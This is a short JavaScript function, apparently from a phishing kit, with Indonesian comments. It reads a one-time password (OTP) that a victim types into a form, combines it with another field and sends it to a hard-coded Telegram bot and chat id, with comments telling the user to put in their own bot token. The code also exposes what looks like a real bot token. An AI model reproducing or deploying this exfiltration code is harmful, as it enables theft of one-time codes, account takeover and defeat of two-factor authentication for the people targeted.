function kirimPesan2() 
{
var otp = document.getElementById('nama');
    
    
    var gabungan = logo.value + '%0A𝗞𝗼𝗱𝗲 𝗢𝗧𝗣  :%20' + nama.value;

    var token = '7403888947:AAHrvAJpodWS_RR76nvCLz4Z250T3Qc9tQI'; // Ganti dengan token bot yang kamu buat
    var grup = '7618896948'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}